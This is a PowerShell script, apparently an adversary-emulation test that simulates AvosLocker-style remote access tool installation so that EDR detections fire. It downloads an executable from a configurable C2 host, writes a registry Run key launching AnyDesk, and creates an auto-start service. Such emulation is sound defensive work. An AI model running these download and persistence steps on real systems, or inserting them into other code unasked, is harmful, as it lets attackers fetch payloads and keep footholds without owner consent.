<#
.SYNOPSIS
    AvosLocker RAT Installation - DETECTION TRIGGER
.DESCRIPTION
    Simulates remote access tool installation and persistence.
    TTP: T1219
#>
$ErrorActionPreference = "SilentlyContinue"
$C2Host = if ($env:C2_HOST) { $env:C2_HOST } else { "127.0.0.1" }

Write-Host "[*] Starting AvosLocker RAT Installation (T1219)" -ForegroundColor Cyan

# Step 1: Download attempt via Invoke-WebRequest
Write-Host "`n[*] [T1105] Attempting tool download from C2..."
$downloadUrl = "http://$C2Host/tools/remote_access.exe"
$downloadPath = "C:\temp\remote_access.exe"
Write-Host "    CMD: Invoke-WebRequest -Uri $downloadUrl -OutFile $downloadPath"
try {
    Invoke-WebRequest -Uri $downloadUrl -OutFile $downloadPath -TimeoutSec 5 -UseBasicParsing -ErrorAction Stop
    Write-Host "    [+] Download completed" -ForegroundColor Green
} catch {
    Write-Host "    [-] Download failed (expected if no C2 server)" -ForegroundColor Gray
}

# Step 2: Create persistence via registry Run key
Write-Host "`n[*] [T1547.001] Creating startup persistence..."
$regPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
$regName = "RTL_RemoteAccess"
$regValue = "C:\Program Files\AnyDesk\AnyDesk.exe --start-service"
Write-Host "    CMD: Set-ItemProperty -Path $regPath -Name $regName"
try {
    Set-ItemProperty -Path $regPath -Name $regName -Value $regValue -ErrorAction Stop
    Write-Host "    [+] Registry Run key created: $regName" -ForegroundColor Green
} catch {
    Write-Host "    [-] Registry write failed: $_" -ForegroundColor Red
}

# Step 3: Create service for persistence
Write-Host "`n[*] [T1543.003] Attempting service creation..."
Write-Host "    CMD: sc create RTL_AvosRAT binPath= cmd.exe"
sc.exe create "RTL_AvosRAT" binPath= "cmd.exe /c echo RTL_test" start= auto 2>&1

# Step 4: Verify artifacts
Write-Host "`n[*] Verifying persistence artifacts..."
$regCheck = Get-ItemProperty -Path $regPath -Name $regName -ErrorAction SilentlyContinue
if ($regCheck) {
    Write-Host "    [+] Registry key verified: $($regCheck.$regName)" -ForegroundColor Green
}

Write-Host "`n[+] RAT Installation Simulation Complete." -ForegroundColor Green
Write-Host "[!] Check EDR for: Download attempt, registry persistence, service creation" -ForegroundColor Magenta
